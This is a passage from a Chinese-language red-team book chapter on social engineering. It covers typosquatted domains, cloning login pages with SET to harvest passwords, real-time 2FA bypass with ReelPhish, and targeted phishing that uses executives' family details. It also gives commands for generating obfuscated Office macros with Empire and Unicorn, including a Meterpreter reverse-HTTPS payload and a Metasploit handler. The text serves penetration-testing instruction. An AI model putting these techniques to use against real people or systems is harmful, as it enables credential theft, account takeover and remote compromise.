恶意软件的最成功方法之一。最常用的技术是购买一个与目标公司的URL非常相似的域名，
或者是目标公司 URL 的一个常见拼写错误的域名。
在上一本书中，我们举了一个例子，如果我们的目标公司有 mail.cyberspacekittens.com 这个
域名，我们将购买 mailcyberspacekittens.com 这个域名，并设置一个假的 Outlook 页面来获
取登录凭证。当受害者进入假网站并输入密码时，我们会收集这些数据并将其重定向到公司
的有效电子邮件服务器（mail.cyberspacekittens.com）。这给受害者留下这样的印象：他们
只是第一次意外地输错了密码，因此，再次输入正确密码并登录他们的帐户。
这种方法最巧妙地一点是你甚至不用做任何网络钓鱼的操作。因为有些人就是会打错域名或
者手误漏掉 “mail” 和 “cyberspacekittens” 之间的点（.），然后进入了错误的网页并输入他们
的登录凭证。我们会提示让受害者把我们的恶意网站添加为书签，这样可以让受害者每天都
访问我们的恶意网页。
如何克隆验证页面
快速克隆Web应用程序登录验证页的最佳工具之一是 TrustedSec 公司开发的社会工程学工具
包（Social Engineering Toolkit，简称 SET）。这是任何需要获取身份凭证的社工活动的标准
工具包。你可以从 https://github.com/trustedsec/social-engineer-toolkit 下载这个工具包。
配置 SET:
将 SET 配置为使用 Apache（而不是默认的 Python ）
将配置文件按照以下内容修改：
gedit /etc/setoolkit/set.config
APACHE_SERVER=ON
APACHE_DIRECTORY=/var/www/html
HARVESTER_LOG=/var/www/html
启动 SET:
cd /opt/social-engineer-toolkit
setoolkit
(1) Spear-Phishing Attack Vectors （鱼叉式钓鱼攻击）
(2) Website Attack Vectors（网站攻击）
(3) Credential Harvester Attack Method （凭证收集攻击方法）
(4) Site Cloner（站点克隆器）
输入你的攻击服务器的 IP
168
第5章 助攻——社会工程学攻击
克隆目标站点
打开浏览器，转到攻击服务器并测试
所有文件都会被储存在 /var/www/html 文件夹下，密码存储在 Harvester* 下。下面是社工活
动中克隆页面时的一些比较好的做法：
搭配使用 Apache 服务器 + SSL
把所有图像和资源移到本地（而不是从被克隆的站点调用）
就我个人而言，我喜欢使用我的 PGP 公钥来存储所有记录的密码。这样，如果服务器受
到入侵，就无法在没有私钥的情况下恢复密码。PHP gnupg_encrypt 和gnupg_decrypt
支持这一做法。
使用双因素验证的身份凭证
我们看到越来越多的客户使用双因素认证（2FA），对于红队来说双因素认证是一个巨大的麻
烦，因为它们不可能被随意绕开。在以前我们必须创建一些定制化的页面，这样可以处理其
中的一些情况。但现在我们有了 ReelPhish，这是 FireEye 公司制作的一个工具。当受害者在
我们的钓鱼网页上输入登陆凭证时，ReelPhish 允许红队利用 Selenium 和 Chrome 来自动触
发双因素验证。
ReelPhish：
克隆需要双因素认证的攻击目标站点。
使用你的攻击工具箱，解析登录到真实站点的流量。在我的例子中，我打开了 Burp
Suite 来获取身份验证所需要的所有 post 参数。
修改克隆站点，使其使用 ReelPhish。访问 /examplesitecode/samplecode.php 并输入你
的身份验证所需的所有必要参数。
受害者进入克隆站点并进行身份验证。
凭证被传输到攻击者手中。
ReelPhish 将在真实站点进行身份验证，触发双因素验证。
受害者收到双因素验证的验证码或电话验证。
受害者被重定向到真实站点重新登录（他们会认为他们在第一次登录时登陆失败了）。
如下图所示，我们现在应该有一个经过身份验证了的会话来绕过双因素验证。虽然 ReelPuish
看起来很像是支持 Linux ，但我在 Kali 中运行它时遇到了一些问题。所以最好是在 Windows
中运行 ReelPuish。你可以在 FireEye 公司的网站上找到更多关于 ReelPhish 的信息：
https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-
phishing-tool.html 。
169
第5章 助攻——社会工程学攻击
还有一些其他工具可以处理不同的双因素验证绕过的情境：
https://github.com/kgretzky/evilginx
https://github.com/ustayready/CredSniper
还有一件事，当对需要双因素认证的网络资源进行身份验证时，请确保你在得到身份凭据后
要尝试使用多种不同的身份验证方法。我的意思是，一些产品可能在 Web 门户网站的身份验
证页面使用了双因素验证，但在 API、旧的客户端或所有的应用程序终端上可能并没有使用双
因素验证。我们已经看到许多应用程序在公共终端上要求双因素验证，但在应用程序的其他
部分则缺乏相应的安全保护。
网络钓鱼
另一个红队已经用之取得了巨大成功的技术是传统的网络钓鱼。网络钓鱼的秘诀在于激发受
害者的恐惧感或者紧迫感，有时也会向受害者描绘一些非常美好(甚至不太真实)的诱惑。我相
信你以前肯定见过一些恐惧感和紧迫感确发挥巨大威力的情境。利用受害者恐惧和紧迫心理
进行攻击的一些例子包括：
一封带有欺诈性购买的虚假电子邮件
有人黑进了你的电子邮件消息
有关税务欺诈的电子邮件
这些一般性攻击的问题是，我们已经注意到公司员工变得越来越聪明。通常，每10封基本钓
鱼式攻击邮件中至少有1封会被上报。在某些情况下，比例甚至更高。这些情况对于一个红队
来说是很有价值的，红队可以持续监控这些简单的网络钓鱼攻击，看看公司在对这些情况的
响应方面是不是有所进步。
170
第5章 助攻——社会工程学攻击
对于那些寻求自动化钓鱼攻击的人，我高度推荐 Gophish。Gophish 非常易于设置和维护，
并且支持模板和 HTML，另外它还会跟踪和记录你所需的一切。如果你是 Ruby 的粉丝的
话，Phishing Frenzy就是一个使用 Ruby 语言写的很好的工具。当然，少不了的也有用
python 语言写的工具，King Phisher 就是使用 Python 开发的。
这些自动化工具非常适合记录简单的网络钓鱼活动。但是对于我们的目标活动，我们得采用
更加手工化的方法。例如，如果我们对受害者的邮件记录进行了一些侦察，了解到客户使用
Office365 ，那么我们就可以思考一下如何利用这个信息来策划一场具有高可行度的入侵行
动。此外，我们还试图寻找该公司泄露信息的电子邮件，从中来捕捉任何其他可能有帮助的
信息，包括他们可能正在运行的程序、新的特性、系统升级、代码合并等等。
我们有时还会开展更具针对性的行动。在这些行动中，我们尝试使用所有的开源工具来搜索
有关人员及其财产、家庭等的信息。例如，针对一些公司高管，我们会在 pipl.com 上搜索他
们，获取他们的社交媒体帐号，找出他们的孩子上学的地方。然后我们向他们发送一封欺骗
性电子邮件，假装是学校发的，说他们需要打开这个 word 文档。要做完这一系列事情可能要
花费很长时间，但好处在于成功率很高。
Microsoft Word/Excel 宏文件
虽然是很老旧，但向受害者发送恶意的 Microsoft Office 文件仍然是久经考验的一种社会工程
学攻击方法。那为什么 Office 文件非常适合作为恶意 payload 的载体呢？这是因为 Office 文
件的默认设置是支持 VBA 代码所以允许 VBA 代码的代码执行。尽管最近这种方法已经很容
易被杀毒软件检测到，但在经过混淆处理之后，在很多情况下仍然可以生效。
在最基础的水平上，我们可以使用 Empire 或 Unicorn 来创建一个 VBA 宏：
使用 Empire:
选择 Macro Stager
usestager windows/macro
确保进行正确的配置
info
创建宏
generate
如果你想为 Meterpreter 创建一个 payload ，我们可以使用像 Unicorn 这样的工具:
cd /opt/unicorn
./unicorn.py windows/meterpreter/reverse_https [your_ip] 443 macro
启动一个 Metasploit Handler
msfconsole -r ./unicorn.rc
一旦生成成功，你的 payload 将如下所示：
171
第5章 助攻——社会工程学攻击
如你所见，这是运行一个简单的 PowerShell base64 混淆脚本。这可以帮助解决绕过一些杀
毒软件，但重要的是要确保在进行实时入侵操作之前对其进行测试。生成宏后，你可以快速
创建一个 Excel 文档：
打开 Excel
转到视图选项卡(View Tab) - >宏 - >查看宏
添加一个宏名称，为 book1 配置宏，然后单击 “创建”
用生成的代码替换所有当前的宏代码
另存为 .xls（Word 97-2003）或 Excel Macro-Enabled 格式的文件
172
第5章 助攻——社会工程学攻击
现在，每当有人打开你的文档时，他们都会收到安全警告并看到一个启用内容的按钮。 如果
你可以诱导受害者点击“启用内容”的按钮，那么你的 PowerShell 脚本将会被执行，这会弹给
你一个 Empire Shell 。
如前所述，宏文件方法是一种久经考验的旧方法，因此很多受害者已经对这种攻击有了一定
的认识。利用 Office 文件的另一种思路是将我们的 payload 嵌入一个批处理文件(.bat)。但在
较新版本的 Office 中，如果受害者双击 Word 文档中的 .bat 文件，对象则不会被执行。我们
通常不得不试图诱导受害者使其将 .bat 文件移动到桌面并执行。
173
第5章 助攻——社会工程学攻击
我们可以用 LuckyStrike 来以更自动化的方式完成此操作。通过使用 LuckyStrike，我们可以
在工作表中使用 Payload 创建 Excel 文档，甚至可以在 Excel 文档中存储完整的可执行文件
（exe），这些文件可以用 ReflectivePE 来触发从而在内存中运行。阅读更多关于
LuckyStrike 的内容：
https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-
generator
我想提到的用于 Office 文件执行的最后一个工具是 VBad。运行 VBad 时，必须在 Office 中
启用宏，并在宏安全设置的下拉框中选择 “信任对 VBA 项目对象模型的访问” 选项。这会允许
VBad 运行 python 代码来更改并创建宏。
VBad 会严重混淆 MS Office 文档中的 payload。它还增加了加密功能，用假密钥来迷惑应急
响应团队。最重要的是，它可以在第一次成功运行后销毁加密密钥（VBad 是一个一次性使用
的恶意软件）。另一个特性是 VBad 也可以销毁对包含有效 payload 的模块的引用，以使其
从 VBA 开发者工具中不可见。这使得分析和排除故障变得更加困难。因此，不仅很难去逆
向，而且如果应急响应团队尝试分析执行的 Word 文档与原始文档，则所有密钥都将丢失。
非宏的 Office 文件 —— DDE
174
第5章 助攻——社会工程学攻击
有时候红队攻击也是一场与时间赛跑的游戏，虽然有些可以利用的易受攻击模块效果很好，
但是如果时间久了，一些杀毒软件或者安全软件已经包含了检测的策略，那么也很难利用，
所以有时候一些新发现的漏洞是更好利用的。在我们的一次评估中，首次公布了一个名为
DDE 的全新易受攻击模块。杀毒软件或任何安全产品还尚未检测到它，因此这是获得我们初
始入口点的好方法。 虽然现在有几种安全产品可以检测 DDE ，但在某些环境中它仍然可能
是一种可行的攻击。
什么是 DDE？
“ Windows 提供了几种在不同的应用程序之间传输数据的方法。其中一种方法就是使用动态
数据交换（DDE）协议。DDE 协议是一组消息和指南。它在共享数据的应用程序之间发送消
息，并使用共享内存在应用程序之间交换数据。应用程序可以使用 DDE 协议进行一次性数据
传输。并且应用程序也可以利用 DDE 协议来进行持续的数据交换，当新数据可用时候，应用